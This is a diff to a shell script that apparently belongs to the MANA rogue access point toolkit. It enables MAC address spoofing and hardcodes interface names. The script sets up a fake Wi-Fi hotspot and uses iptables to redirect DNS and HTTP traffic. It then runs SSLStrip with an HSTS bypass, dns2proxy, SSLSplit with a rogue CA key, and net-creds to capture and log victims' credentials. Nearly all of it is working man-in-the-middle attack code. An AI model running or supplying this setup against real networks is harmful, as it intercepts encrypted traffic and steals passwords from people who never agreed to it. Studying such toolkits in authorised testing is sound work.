@@ -16,9 +16,9 @@ sleep 2
 service network-manager stop
 rfkill unblock wlan
 
-#ifconfig $phy down
-#macchanger -r $phy
-#ifconfig $phy up
+ifconfig wlan1 down
+macchanger -r wlan1
+ifconfig wlan1 up
 
 sed -i "s/^interface=.*$/interface=wlan1/" $conf
 $hostapd $conf&
@@ -54,10 +54,10 @@ iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to 10.10.10.1
 #SSLStrip with HSTS bypass
 cd /usr/share/mana-toolkit/sslstrip-hsts/sslstrip2/
 python sslstrip.py -l 10000 -a -w /var/lib/mana-toolkit/sslstrip.log.`date "+%s"`&
-iptables -t nat -A PREROUTING -i $phy -p tcp --destination-port 80 -j REDIRECT --to-port 10000
+iptables -t nat -A PREROUTING -i eth0:1 -p tcp --destination-port 80 -j REDIRECT --to-port 10000
 cd /usr/share/mana-toolkit/sslstrip-hsts/dns2proxy/
 python dns2proxy.py -i eth0:1&
-cd -
+cd /usr/share/mana-toolkit/sslstrip-hsts/dns2proxy/
 
 #SSLSplit
 sslsplit -D -P -Z -S /var/lib/mana-toolkit/sslsplit -c /usr/share/mana-toolkit/cert/rogue-ca.pem -k /usr/share/mana-toolkit/cert/rogue-ca.key -O -l /var/lib/mana-toolkit/sslsplit-connect.log.`date "+%s"` \
@@ -102,6 +102,8 @@ iptables -t nat -A PREROUTING -i $phy \
 
 # Start net-creds
 python /usr/share/mana-toolkit/net-creds/net-creds.py -i $phy > /var/lib/mana-toolkit/net-creds.log.`date "+%s"`
+
+
 
 echo "Hit enter to kill me"
 read
